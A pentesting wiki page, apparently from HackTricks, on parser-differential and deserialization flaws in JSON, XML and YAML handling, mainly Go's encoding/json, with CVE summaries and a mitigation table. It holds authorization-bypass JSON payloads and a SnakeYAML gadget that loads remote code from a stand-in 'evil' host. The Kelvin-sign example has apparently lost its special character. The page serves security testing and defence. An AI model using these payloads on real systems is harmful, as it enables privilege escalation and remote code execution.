---
title: "JSON, XML and YAML Hacking"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/json-xml-yaml-hacking.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

# JSON, XML, and YAML Hacking and Issues

## Go JSON Decoder

The following Go parser behaviors can create security problems when different components interpret the same input differently. They were analyzed in [this Trail of Bits post](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/), and the Go documentation explicitly records several `encoding/json` interoperability behaviors.[\[1\]](#references)[\[4\]](#references)

Parser differentials and permissive application-level validation can be abused to **bypass authorization**, **escalate privileges**, or **exfiltrate sensitive data**. The risky behavior is often the composition of parsers and trust decisions, rather than memory-unsafe parsing by itself.[\[1\]](#references)

### (Un)Marshaling Unexpected Data

The goal is to find exported struct fields that an application did not intend an attacker to set, such as `IsAdmin` or `Password`.[\[1\]](#references)[\[4\]](#references)

- Example Struct:

```
type User struct {
    Username string `json:"username,omitempty"`
    Password string `json:"password,omitempty"`
    IsAdmin  bool   `json:"-"`
}
```
- Common Vulnerabilities

1. **Missing tag** (no tag = field is still parsed by default):

```
type User struct {
    Username string
}
```
Payload:

```
{"Username": "admin"}
```
1. **Incorrect use of `-`** :

```
type User struct {
    IsAdmin bool `json:"-,omitempty"` // ❌ wrong
}
```
Payload:

```
{"-": true}
```
✔️ Proper way to block field from being (un)marshaled:

```
type User struct {
    IsAdmin bool `json:"-"`
}
```
### Parser Differentials

The goal is to bypass authorization by exploiting how different parsers interpret the same payload. Real cases include CouchDB’s duplicate-key administrator bypass, a Zoom XMPP/XML parser differential, and GitLab’s 2025 SAML parser-confusion bypass.[\[5\]](#references)[\[6\]](#references)[\[7\]](#references)

**1. Duplicate Fields (legacy `encoding/json` v1 semantics):**
Go’s `encoding/json` processes duplicate members in order; later scalar values replace earlier ones, while maps and structs can merge values.[\[4\]](#references)

```
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Other parsers or configurations may reject duplicates, preserve the first value, or also preserve the last value. This becomes exploitable when security checks and business logic disagree about the same object.[\[1\]](#references)[\[4\]](#references)

**2. Case-insensitive matching (legacy `encoding/json` v1 semantics):**
Go’s legacy decoder matches JSON names to struct fields case-insensitively:

```
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Unicode simple-fold equivalents can also match. For example, the long-s character can collide with ASCII `s`, and the Kelvin sign can collide with ASCII `K` in field names:[\[1\]](#references)

```
json.Unmarshal([]byte(`{"Uſername":"admin"}`), &user)
// may match the exported field Username
json.Unmarshal([]byte(`{"Key":"value"}`), &record)
// may match the exported field Key
```
**3. Cross-service mismatch:**
Imagine:

- Proxy written in Go
- AuthZ service written in Python

Attacker sends:

```
{
  "action": "UserAction",
  "AcTiOn": "AdminAction"
}
```
- Python sees `UserAction` , allows it
- Go sees `AdminAction` , executes it

### Data Format Confusion (Polyglots)

The goal is to exploit systems that mix formats (JSON/XML/YAML) or fail open on parser errors. In **CVE-2020-16250**, Vault’s AWS authentication trusted identity data obtained through a content-type/parser confusion involving AWS STS responses.[\[8\]](#references)

Attacker controls:

- The `Accept: application/json` header
- Partial control of JSON body

Go’s XML parser parsed it **anyway** and trusted the injected identity.

- Crafted payload:

```
{
  "action": "Action_1",
  "AcTiOn": "Action_2",
  "ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Result:

- **Go JSON** parser:`Action_2` (case-insensitive + last wins)
- **YAML** parser:`Action_1` (case-sensitive)
- **XML** parser: parses`"Action_3"` inside the string

### Go 1.27: strict `encoding/json/v2` defaults

`encoding/json/v2` defaults
Go 1.27 made `encoding/json/v2` and `encoding/json/jsontext` standard packages. Unlike the legacy v1 API, v2 rejects **duplicate object names** and **invalid UTF-8** by default; the existing `encoding/json` API remains compatible with v1 behavior even though its implementation is backed by v2. Therefore, fingerprint the API and options actually used by each service instead of assuming every Go 1.27 binary is strict.[\[4\]](#references)[\[12\]](#references)

A duplicate-name probe that v2 rejects by default is:[\[12\]](#references)

```
import json "encoding/json/v2"
err := json.Unmarshal([]byte(`{"role":"user","role":"admin"}`), &dst)
// err != nil
```
This is also a migration hazard: a gateway using v2 defaults may reject an input that a downstream service using v1 would accept, while compatibility options can deliberately restore permissive behavior. Test duplicate names, malformed UTF-8, case variants, and unknown members at **every trust boundary**.[\[4\]](#references)[\[12\]](#references)

## Differential Fuzzing of Parser Chains

[Crossy](https://github.com/j-moeller/crossy) is the research artifact for cross-language, coverage-guided differential testing of JSON parsers. It builds parser harnesses in isolated containers, feeds the same corpus to several implementations, and reports semantic disagreements instead of looking only for crashes. This is useful when a proxy, policy engine, signature verifier, and backend do not use the same parser.[\[11\]](#references)

```
git clone https://github.com/j-moeller/crossy
cd crossy
make
make run
# Inside the runner container:
./build/crossy configs/json/* -o ./output/ -- corpus \
  -detect_leaks=0 -artifact_prefix=./output/
```
Prioritize seeds that exercise duplicate or case-colliding names, escaped and non-ASCII keys, invalid UTF-8/lone surrogates, large or exponent-form numbers, deeply nested values, and leading/trailing data. Minimize each disagreement, then replay the exact raw bytes through the real gateway and backend: reserialization before the second parser may erase the differential.[\[11\]](#references)

## Notable Parser Vulnerabilities (2023-2025)

The following publicly-exploitable issues show that insecure parsing is a multi-language problem — not just a Go problem.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

- Affects: `org.yaml:snakeyaml` <**2.0** (used by Spring-Boot, Jenkins, etc.).<sup>[\[2\]](#references)</sup>
- Root cause: unsafe construction can instantiate **arbitrary Java classes** , allowing a suitable classpath or remotely supplied service-provider gadget to culminate in code execution.
- Example global-tag payload (the remote URL must provide a compatible `ScriptEngine` provider for code execution):

```
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
- Fix / Mitigation:
  1. **Upgrade to ≥2.0** (uses`SafeLoader` by default).
  2. On older versions, explicitly use `new Yaml(new SafeConstructor())` .

### libyaml Double-Free (CVE-2024-35325)

- Affects: `libyaml` ≤0.2.5 (C library leveraged by many language bindings).
- Issue: Calling `yaml_event_delete()` twice leads to a double-free that attackers can turn into DoS or, in some scenarios, heap exploitation.
- Status: Upstream rejected as “API misuse”, but Linux distributions shipped patched **0.2.6** that null-frees the pointer defensively.<sup>[\[3\]](#references)</sup>

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

- Affects: Tencent **RapidJSON** before commit`8269bc2` (<1.1.0-patch-22).
- Bug: integer underflow/overflow in `GenericReader::ParseNumber()` can be triggered by crafted numeric input. The published records describe elevation-of-privilege impact in an application that opens a crafted file; do not generalize that impact to every program using RapidJSON.<sup>[\[9\]](#references)[\[10\]](#references)</sup>

### 🔐 Mitigations (Updated)

| Risk | Fix / Recommendation |
|---|---|
| Unknown fields (JSON) | `decoder.DisallowUnknownFields()` |
| Duplicate fields (JSON) | Prefer `encoding/json/v2` defaults on Go 1.27+; otherwise pre-scan/reject duplicates (`DisallowUnknownFields` does not reject them) |
| Case-insensitive match (Go v1) | Migrate security boundaries to `encoding/json/v2` , or validate exact keys before v1 unmarshaling |
| XML shape / format confusion | Keep `encoding/xml.Decoder.Strict` enabled, reject unexpected directives/tokens, validate the root/schema, and enforce the expected content type |
| YAML unknown keys | `yaml.KnownFields(true)` |
| **Unsafe YAML deserialization** | Use SafeConstructor / upgrade to SnakeYAML ≥2.0 |
| libyaml ≤0.2.5 double-free | Upgrade to **0.2.6** or distro-patched release |
| RapidJSON <patched commit | Compile against latest RapidJSON (≥July 2024) |

## See also

See [HTTP parameter pollution and JSON key-collision payloads](parameter-pollution.html#json-injection) and [XXE/XEE](xxe-xee-xml-external-entity.html) for their format-specific attack payloads.

## References
